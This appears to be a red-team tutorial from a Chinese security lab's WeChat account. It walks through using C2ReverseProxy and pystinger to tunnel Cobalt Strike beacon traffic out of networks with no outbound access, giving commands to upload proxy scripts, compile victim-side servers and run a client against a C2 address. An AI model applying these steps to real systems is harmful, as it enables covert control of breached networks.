#  工具推荐之不出网环境下上线CS

原创 烽火台实验室  [ Beacon Tower Lab ](javascript:void\(0\);)

**Beacon Tower Lab** ![]()

微信号 WebRAY_BTL

功能介绍 "海上千烽火，沙中百战场"，烽火台实验室将为您持续输出前沿的安全攻防技术

____

___发表于_

收录于合集

  

**前言**

  

在实战攻防演练中，我们经常会遇到目标不出网的情况，即便获取了目标权限也不方便在目标网络进行下一步横向移动。本期我们将会推荐两个常用的代理工具，使我们能在不出网的环境下让目标上线到CS，方便后渗透的工作。

  

  

 **工具1：DReverseServer**

  

 **工具链接：**

https://github.com/Daybr4ak/C2ReverseProxy

  

 **工具原理：**

利用代理转发将目标服务器上的CS的流量特征转发到CS服务端上，类似模拟一个木马在本地Listener进行上线。

  

 **官方使用说明：**

1、将C2script目录下的对应文件，如proxy.ashx 以及C2ReverseServer上传到目标服务器。

2、使用C2ReverseServer建立监听端口：

./C2ReverseServer  (默认为64535)

3、修改C2script目录下对应文件的PORT，与C2ReverseServer监听的端口一致。

4、本地或C2服务器上运行C2ReverseClint工具

./C2ReverseClint -t C2IP:C2ListenerPort -u http://example.com/proxy.php
(传送到目标服务器上的proxy.php路径)

5、使用CobaltStrike建立本地Listener(127.0.0.1 64535)端口与C2ReverseServer建立的端口对应

6、使用建立的Listner生成可执行文件beacon.exe传至目标服务器运行

7、可以看到CobaltStrike上线。

![]()

 **DReverseServer复现步骤**

  

 **1、放置脚本文件到目标服务器**

![]()

  

 **2、编译服务端程序**

 **  
**

在cmd命令行输入 CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build
DReverseServer.go完成受害者端应用程序编译。

![]()

  

 **3、编译CS端程序**

 **  
**

在cmd命令行输入CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build
DReverseClint.go完成CS端应用程序编译。  

![]()

  

 **4、生成stagerless木马**

 **  
**

Staged 和 Stageless 的区别在于Staged实际功能只是程序执行后和C2
建立连接并接收真正的shellcode,然后加载执行(这里服务器不出网所以导致无法正常建立连接)；而 Stageless 直接省去了接收 Payload
的步骤 。  

![]()

  

 **5、目标客户端监听**

![]()

  

 **6、CS端监听**

![]()

  

 **7、等待上线**

![]()

  

 **8、注意事项**

 **  
**

a) 本地复现php脚本需打开socket选项。

![]()

  

b)
建议用户对CS的jar文件中的/resources/default.profile进行修改，将sleeptime值修改1000以下，这样CS生存的木马上线就不用默认等待60秒。

![]()

  

 **工具2：pystinger**

  

 **工具链接：**

https://github.com/FunnyWolf/pystinger/  

  

 **工具原理：**

利用内网反向代理转发将目标服务器上的木马上线与连接、操作流量特征通过HTTP协议方式转发至C2服务端，使其目标在不出网情况下上线MSF、viper、CS。

  

 **官方使用说明：**

详见https://github.com/FunnyWolf/pystinger/blob/master/readme_cn.md

  

 **pystinger复现步骤**

 **  
**

工具可分为2块内容：

  

1、stinger_server程序+proxy脚本。

2、stinger_client程序+木马程序

![]()

  

 **1、放置脚本文件到目标服务器**

 **  
**

访问下图页面代表成功。

![]()

  

 **2、在目标机器运行stinger_server**

![]()

  

 **3、在CS端运行stinger_client**

![]()

  

 **4、生成木马**

 **  
**

根据stinger_server反馈的Payload端口，在CS界面新增一个Listener，并使用这个Listener新生成一个恶意木马。

![]()

  

我们通过命令界面能看到网络连接详情，最后愉快的开启内网渗透。

![]()![]()![]()

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

